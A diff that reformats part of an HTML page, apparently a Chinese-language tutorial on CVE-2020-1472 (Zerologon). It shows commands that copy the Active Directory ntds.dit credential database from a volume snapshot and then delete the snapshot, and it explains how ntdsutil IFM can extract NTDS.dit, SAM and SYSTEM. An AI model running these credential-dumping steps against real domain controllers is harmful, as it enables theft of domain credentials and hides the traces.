@@ -2217,9 +2217,17 @@
 
 
 <p><img src="/2021/11/22/CVE-2020-1472/image-20211112012438868.png" alt="image-20211112012438868"></p>
-<ol start="3">
-<li>~~~<br>copy C:$SNAP_202111120118_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit   //将快照中的ntds.dit拷贝到c盘<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20211112012707478](CVE-2020-1472/image-20211112012707478.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4. ~~~</span><br><span class="line">   ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; &quot;delete &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit				//删除刚才创建的快照</span><br></pre></td></tr></table></figure></li>
-</ol>
+<p>3.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202111120118_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit  </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/11/22/CVE-2020-1472/image-20211112012707478.png" alt="image-20211112012707478"></p>
+<p>//将快照中的ntds.dit拷贝到c盘</p>
+<p>4.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; &quot;delete &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit		</span><br></pre></td></tr></table></figure>
+
+<p>//删除刚才创建的快照</p>
 <p><img src="/2021/11/22/CVE-2020-1472/image-20211112012835669.png" alt="image-20211112012835669"></p>
 <p>除了利用上面那种操作来获取ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。<strong>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</strong></p>
 <p>Ntdsutil是本地处理 Active Directory 的命令实用程序，并为DCPromo启用IFM集创建。IFM与DCPromo一起用于“从媒体安装”，因此被升级的服务器不需要通过网络从另一个DC复制域数据。</p>
